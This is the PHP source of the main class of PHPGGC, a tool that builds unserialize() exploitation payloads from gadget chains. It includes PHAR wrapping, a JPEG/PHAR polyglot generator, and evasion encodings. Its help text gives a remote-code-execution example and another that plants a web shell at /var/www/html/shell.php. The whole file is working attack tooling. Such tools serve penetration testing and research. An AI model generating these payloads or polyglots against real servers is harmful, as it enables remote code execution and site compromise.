<?php
# PHPGGC: PHP Generic Gadget Chains
# Library of generic exploitation vectors for unserialize()
#

class PHPGGC
{
    const DIR_GADGETCHAINS = '/gadgetchains';
    const DIR_TEMPLATES = '/templates';
    const DIR_BASE_GADGETCHAINS = '/lib/PHPGGC/GadgetChain';
    const DIR_LIB = '/lib';

    protected $has_wrapper = False;
    protected $chains;
    protected $output = null;

    public function __construct()
    {
        $this->base = realpath(dirname(dirname(__FILE__)));
        spl_autoload_register(array($this, 'autoload'));
        $this->chains = $this->get_gadget_chains();
    }

    /**
     * Generates a payload from the command line arguments.
     * First, the gadget is loaded, and then it is generated using additional
     * arguments.
     */
    public function generate()
    {
        global $argv;

        $parameters = $this->parse_cmdline($argv);

        if($parameters === null)
        {
            return;
        }

        if(count($parameters) < 1)
        {
            $this->help();
            return;
        }

        $class = array_shift($parameters);
        $gc = $this->get_gadget_chain($class);

        $parameters = $this->get_type_parameters($gc, $parameters);
        $generated = $this->serialize($gc, $parameters);
        $this->output_payload($generated);
    }

    public function output_payload($payload)
    {
        if(!isset($this->parameters['output']))
        {
            print($payload . "\n");
            return;
        }
        file_put_contents($this->parameters['output'], $payload);
    }

    /**
     * Gets an instance of the given GadgetChain class.
     */
    public function get_gadget_chain($class)
    {
        $full = strtolower('GadgetChain/' . $class);

        if(!in_array($full, array_keys($this->chains)))
        {
            throw new PHPGGC\Exception('Unknown gadget chain: ' . $class);
        }

        if(
            isset($this->parameters['phar']) &&
            $this->chains[$full]->vector != '__destruct'
        )
        {
            $e = 'Phar archives require a __destruct vector';
            throw new PHPGGC\Exception($e);
        }

        return $this->chains[$full];
    }

    /**
     * Generates the serialized payload from given gadget and parameters.
     */
    public function serialize($gc, $parameters)
    {
        $gc->load_gadgets();

        $parameters = $gc->pre_process($parameters);
        $payload = $gc->generate($parameters);
        $payload = $this->wrap($payload);

        $serialized = serialize($payload);

        $serialized = $gc->post_process($serialized);
        $serialized = $this->apply_filters($serialized);

        return $serialized;
    }

    /**
     * Includes every file that might contain a gadget.
     */
    protected function include_gadget_chains()
    {
        $base = $this->base . self::DIR_GADGETCHAINS;
        $files = glob($base . '/*/*/*/chain.php');
        array_map(function ($file) {
            include_once $file;
        }, $files);
    }

    /**
     * Loads every available gadget and returns an array of the form
     * class_name => object.
     */
    public function get_gadget_chains()
    {
        $this->include_gadget_chains();

        $classes = get_declared_classes();
        $classes = array_filter($classes, function($class) {
            return is_subclass_of($class, '\\PHPGGC\\GadgetChain') &&
                   strpos($class, 'GadgetChain\\') === 0;
        });
        $objects = array_map(function($class) {
            return new $class();
        }, $classes);

        # Convert backslashes in classes names to forward slashes,
        # so that the command line is easier to use
        $classes = array_map(function($class) {
            return strtolower(str_replace('\\', '/', $class));
        }, $classes);
        return array_combine($classes, $objects);
    }

    /**
     * Includes a PHP file containing a wrapper($data) function.
     * This method will be called after the gadget chain has been generated,
     * and before serialize() is called, in order to modify the payload if
     * need be.
     */
    public function set_wrapper($file)
    {
        include $file;
        $this->_has_wrapper = true;
    }

    /**
     * Wraps the payload into something else if the user required it.
     * For instance, if a specific unserialize call requires an array, one could
     * build a wrapper function of the likes:
     *
     * function wrapper($payload)
     * {
     *     return array('id' => '123', 'data' => $payload);
     * }
     *
     * The returned serialized payload would be an array which contains the
     * payload under the key "data".
     */
    public function wrap($payload)
    {
        if(!isset($this->parameters['wrapper']))
            return $payload;

        include $this->parameters['wrapper'];

        if(!function_exists('wrapper'))
        {
            $message = 'Wrapper file does not define wrapper($payload)';
            throw new \PHPGGC\Exception($message);
        }

        return call_user_func('wrapper', $payload);
    }

    /**
     * Autoloads PHPGGC base classes only, in order to avoid conflict between
     * different gadget chains.
     */
    public function autoload($class)
    {
        if(strpos($class, 'PHPGGC\\') === 0)
        {
            $file = str_replace('\\', '/', $class) . '.php';
            include_once $this->base . self::DIR_LIB . '/' . $file;
        }
    }

    /**
     * Creates the file structure for a new gadget chain targeting $name and of
     * type $type.
     */
    function new_gc($name, $type)
    {
        $namespace = '\\PHPGGC\\GadgetChain';
        
        # Check type

        $type = strtoupper($type);
        $reflection = new ReflectionClass($namespace);
        $constant = 'TYPE_' . $type;
        $value = $reflection->getConstant($constant);

        if($value === false)
        {
            $this->o('Invalid type: ' . $type);
            return;
        }

        # Match base class from type

        $base = $this->base . self::DIR_BASE_GADGETCHAINS;
        $files = glob($base . '/*.php');

        foreach($files as $file)
        {
            $classname = substr(basename($file), 0, -4);
            $classname = $namespace . '\\' . $classname;
            $reflection = new ReflectionClass($classname);

            if($reflection->getProperty('type')->getValue() === $value)
            {
                $baseclass = $reflection;
                break;
            }
        }
        
        if(!isset($baseclass))
        {
            $this->o('No base class for type: ' . $type);
            return;
        }

        # Create directory structure

        $base = $this->base . self::DIR_GADGETCHAINS;
        $base = $base . '/' . $name . '/' . $type . '/';

        for($i=1;file_exists($base . $i);$i++);

        $base = $base . $i;
        mkdir($base, 0777, true);

        $replacements = [
            '{NAME}' => $name,
            '{CLASS_NAME}' => $type . $i,
            '{BASE_CLASS_NAME}' => $baseclass->getName()
        ];

        $this->create_from_template($base, 'chain.php', $replacements);
        $this->create_from_template($base, 'gadgets.php');

        # Display success message

        $full_name = $replacements['{NAME}'] . '\\'
                   . $replacements['{CLASS_NAME}'];
        $base = substr($base, strlen($this->base) + 1);

        $this->o('Created ' . $full_name . ' under: ' . $base);
    }

    /**
     * Creates a file in directory $path from template $name.
     */
    function create_from_template($path, $name, $replacements=null)
    {
        $template = $this->base . self::DIR_TEMPLATES . '/' . $name;
        $template = file_get_contents($template);

        if($replacements)
            $template = strtr($template, $replacements);

        file_put_contents($path . '/' . $name, $template);
    }

    #
    # Phar
    #

    /**
     * Generates a PHAR file of the correct format (PHAR, TAR, ZIP).
     */
    function phar_generate($serialized)
    {
        $format = $this->parameters['phar'];
        
        $prefix = '';
        if(isset($this->parameters['phar-prefix']))
            $prefix = file_get_contents($this->parameters['phar-prefix']);
        $filename = 'test.txt';
        if(isset($this->parameters['phar-filename']))
            $filename = $this->parameters['phar-filename'];

        $class = 'PHPGGC\\Phar\\' . ucfirst($format);

        $phar = new $class($serialized, compact('prefix', 'filename'));
        $phar->replace_metadata();
        $phar->update_signature();
        return $phar->get_data();
    }

    function pharify($serialized)
    {
        if(ini_get('phar.readonly') == '1')
        {
            $e = 'Cannot create phar: phar.readonly is set to 1';
            throw new PHPGGC\Exception($e);
        }

        $serialized = $this->phar_generate($serialized);
        
        if(isset($this->parameters['phar-jpeg']))
        {
            $jpeg = file_get_contents($this->parameters['phar-jpeg']);
            $serialized = $this->generate_polyglot($serialized, $jpeg);
        }
        
        return $serialized;
    }

    function generate_polyglot($phar, $jpeg)
    {
        $phar = substr($phar, 6);
        $len = strlen($phar);
        $contents = 
            substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) .
            chr($len & 0xff) . $phar . substr($jpeg, 2);
        $contents =
            substr($contents, 0, 148) .
            "        " .
            substr($contents, 156)
        ;
    
        $chksum = 0;
    
        for ($i=0;$i<512;$i++)
        {
            $chksum += ord(substr($contents, $i, 1));
        }
    
        $oct = sprintf("%07o", $chksum);
        $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
        return $contents;
    }

    /**
     * Applies command line filters on the serialized payload.
     */
    protected function apply_filters($serialized)
    {
        # Enhancements
        if(in_array('ascii-strings', $this->options))
            $serialized = \PHPGGC\Enhancements::ascii_strings($serialized);
        if(in_array('fast-destruct', $this->options))
            $serialized = \PHPGGC\Enhancements::fast_destruct($serialized);

        if(isset($this->parameters['phar']))
            $serialized = $this->pharify($serialized);

        foreach($this->options as $v)
        {
            switch($v)
            {
                case 'base64':
                    $serialized = base64_encode($serialized);
                    break;
                case 'url':
                    $serialized = urlencode($serialized);
                    break;
                case 'soft':
                    $keys = str_split("%\x00\n\r\t+");
                    $values = array_map('urlencode', $keys);
                    $serialized = str_replace($keys, $values, $serialized);
                    break;
            }
        }

        return $serialized;
    }

    #
    # Display
    #

    /**
     * Displays a message.
     */
    function output($message, $r=1)
    {
        $n = str_repeat("\n", $r);
        print($message . $n);
    }

    /**
     * Wrapper for output().
     */
    protected function o($message, $r=1)
    {
        $this->output($message, $r);
    }

    /**
     * Generates an ASCII array.
     */
    protected function table($titles, $data)
    {
        $titles = array_map('strtoupper', $titles);
        $data = array_merge([$titles], $data);
        $pad = array_fill(0, count($titles), 0);
        
        foreach($data as $row)
        {
            foreach($row as $i => $cell)
            {
                $pad[$i] = max($pad[$i], strlen($cell));
            }
        }

        $array = '';

        foreach($data as $row)
        {
            foreach($row as $i => $cell)
            {
                $array .= str_pad($cell, $pad[$i]) . '    ';
            }
            $array .= "\n";
        }

        return $array;
    }

    protected function list_gc()
    {
        $this->o("");
        $this->o("Gadget Chains");
        $this->o("-------------", 2);

        $titles = [
            'Name',
            'Version',
            'Type',
            'Vector',
            'I'
        ];

        $data = [];
        foreach($this->chains as $chain)
        {
            $data[] = [
                $chain->get_name(),
                $chain->version,
                $chain::$type,
                $chain->vector,
                ($chain->informations ? '*' : '')
            ];
        }

        $this->o($this->table($titles, $data));

        exit(0);
    }

    protected function help()
    {
        $this->o("");
        $this->o("PHPGGC: PHP Generic Gadget Chains");
        $this->o("---------------------------------", 2);

        $this->o("USAGE");
        $this->o("  " . $this->_get_command_line(
            '[-h|-l|-i|...]',
            '<GadgetChain>',
            '[arguments]'
        ), 2);

        $this->o("INFORMATION");
        $this->o("  -h, --help Displays help");
        $this->o("  -l, --list Lists available gadget chains");
        $this->o("  -i, --info Displays informations about a gadget chain");
        $this->o("");
        $this->o("OUTPUT");
        $this->o("  -o, --output <file>");
        $this->o("     Outputs the payload to a file instead of standard output");
        $this->o("");
        $this->o("MODIFICATION");
        $this->o("  -w, --wrapper <wrapper>");
        $this->o("     Specifies a file containing a function: wrapper(\$payload)");
        $this->o("     This function will be called before the generated gadget is serialized.");
        $this->o("");
        $this->o("PHAR");
        $this->o("  -p, --phar <tar|zip|phar>");
        $this->o("     Creates a PHAR file of the given format");
        $this->o("  -pj, --phar-jpeg <file>");
        $this->o("     Creates a polyglot JPEG/PHAR file from given image");
        $this->o("  -pp, --phar-prefix <file>");
        $this->o("     Sets the PHAR prefix as the contents of the given file.");
        $this->o("     Generally used with -p phar to control the beginning of the generated file.");
        $this->o("  -pf, --phar-filename <filename>");
        $this->o("     Defines the name of the file contained in the generated PHAR (default: test.txt)");
        $this->o("");
        $this->o("ENHANCEMENTS");
        $this->o("  -f, --fast-destruct");
        $this->o("     Applies the fast-destruct technique, so that the object is destroyed");
        $this->o("     right after the unserialize() call, as opposed to at the end of the");
        $this->o("     script");
        $this->o("  -a, --ascii-strings");
        $this->o("     Uses the 'S' serialization format instead of the standard 's'. This");
        $this->o("     replaces every non-ASCII value to an hexadecimal representation:");
        $this->o("     s:5:\"A<null_byte>B<cr><lf>\"; -> S:5:\"A\\00B\\09\\0D\";");
        $this->o("     This is experimental and it might not work in some cases.");
        $this->o("");
        $this->o("ENCODING");
        $this->o("  -s, --soft   Soft URLencode");
        $this->o("  -u, --url    URLencodes the payload");
        $this->o("  -b, --base64 Converts the output into base64");
        $this->o("  Encoders can be chained, for instance -b -u -u base64s the payload,");
        $this->o("  then URLencodes it twice");
        $this->o("");

        $this->o("EXAMPLES");
        $this->o("  " . $this->_get_command_line(
            'Laravel/RCE1',
            'system',
            'id'
        ));
        $this->o("  " . $this->_get_command_line(
            'SwiftMailer/FW1',
            '/var/www/html/shell.php',
            '/path/to/local/shell.php'
        ));
        $this->o("");

        exit(0);
    }

    function _parse_cmdline_arg(&$i, &$argv, &$parameters, &$options)
    {
        $count = count($argv);

        # Define valid arguments and their abbreviations, which is generally
        # their first letter

        $valid_arguments = [
            'new' => true,
            'informations' => true,
            'help' => false,
            'list' => false,
            'output' => true,
            'wrapper' => true,
            # Phar
            'phar' => true,
            'phar-jpeg' => true,
            'phar-prefix' => true,
            'phar-filename' => true,
            # Enhancements
            'fast-destruct' => false,
            'ascii-strings' => false,
            # Encoders
            'soft' => false,
            'base64' => false,
            'url' => false,
        ];

        $abbreviations = [];

        foreach($valid_arguments as $k => $v)
        {
            $abbreviations[$k] = $k{0};
        }

        $abbreviations = [
            'phar-jpeg' => 'pj',
            'phar-prefix' => 'pp',
            'phar-filename' => 'pf',
        ] + $abbreviations;

        # If we are in this function, the argument starts with a dash, so we
        # can safely remove it
        $arg = substr($argv[$i], 1);
        $valid = false;

        # Find whether given argument is valid and if so, set it as a parameter
        # or an option

        foreach($valid_arguments as $argument => $has_parameter)
        {
            # Check for short and long arguments (-a, --argument)
            if(
                $arg == $abbreviations[$argument] ||
                $arg == '-' . $argument
            )
            {
                $valid = true;

                # Does it expect a parameter ?
                if($has_parameter)
                {
                    if($count < $i + 1)
                    {
                        $e = 'Parameter "' . $argument . '" expects a value';
                        throw new \PHPGGC\Exception($e);
                    }

                    $parameters[$argument] = $argv[$i+1];
                    $i++;
                }
                else
                {
                    $options[] = $argument;
                }

                break;
            }
        }
        
        if(!$valid)
        {
            throw new PHPGGC\Exception('Unknown parameter: -' . $arg);
        }
    }

    /**
     * Parses the command line arguments.
     */
    protected function parse_cmdline($argv)
    {
        # Parameters expect a value, options don't
        $parameters = [];
        $options = [];
        $arguments = [];

        for($i=1;$i<count($argv);$i++)
        {
            $arg = $argv[$i];
            # Abort argument parsing
            if($arg == '--')
            {
                $arguments += array_slice($argv, $i+1);
                break;
            }
            # This is a parameter or an option
            if(strlen($arg) >= 2 && $arg{0} == '-')
                $this->_parse_cmdline_arg($i, $argv, $parameters, $options);
            # This is a value
            else
                $arguments[] = $arg;
        }

        # Handle options and parameters in case they need to be handled now.

        foreach($options as $option)
        {
            switch($option)
            {
                case 'list':
                    $this->list_gc();
                    return;
                case 'help':
                    $this->help();
                    return;
            }
        }

        foreach($parameters as $key => $value)
        {
            switch($key)
            {
                case 'informations':
                    $gc = $this->get_gadget_chain($value);
                    $this->o($gc, 2);
                    $this->o($this->_get_command_line_gc($gc));
                    return;
                case 'new':
                    if(count($arguments) < 1)
                    {
                        $line = $this->_get_command_line('<Framework> <type>');
                        $this->o($line);
                    }
                    else
                        $this->new_gc($value, $arguments[0]);
                    return;
                case 'phar':
                    if(!in_array($value, ['phar', 'tar', 'zip']))
                    {
                        $e = '"' . $value . '" is not a valid PHAR format';
                        throw new PHPGGC\Exception($e);
                    }
                    break;
                case 'phar-jpeg':
                    if(!isset($parameters['phar']))
                    {
                        $parameters['phar'] = 'tar';
                    }
                    else if($parameters['phar'] != 'tar')
                    {
                        $e = '"--phar-jpeg" implies "--phar tar"';
                        throw new PHPGGC\Exception($e);
                    }
                    # fall through
                case 'phar-prefix':
                case 'wrapper':
                    if(!file_exists($value))
                    {
                        $e = $key . ': File "' . $value . '" does not exist';
                        throw new PHPGGC\Exception($e);
                    }
                    break;
            }
        }

        # Otherwise, store them and return the rest of the command line

        $this->options = $options;
        $this->parameters = $parameters;

        # Return remaining arguments
        return $arguments;
    }

    /**
     * Convert command line parameters into an array of named parameters,
     * specific to the type of payload.
     */
    protected function get_type_parameters($gc, $parameters)
    {
        $arguments = $gc->parameters;

        $values = @array_combine($arguments, $parameters);

        if($values === false)
        {
            $this->o($gc, 2);
            $message = 'Invalid arguments for type "' . $gc::$type . '" ' . "\n"
                     . $this->_get_command_line_gc($gc);
            throw new PHPGGC\Exception($message);
        }

        return $values;
    }

    protected function _get_command_line_gc($gc)
    {
        $arguments = array_map(function ($a) {
                return '<' . $a . '>';
        }, $gc->parameters);
        return $this->_get_command_line($gc->get_name(), ...$arguments);
    }

    private function _get_command_line(...$arguments)
    {
        return './phpggc ' . implode(' ', $arguments);
    }
}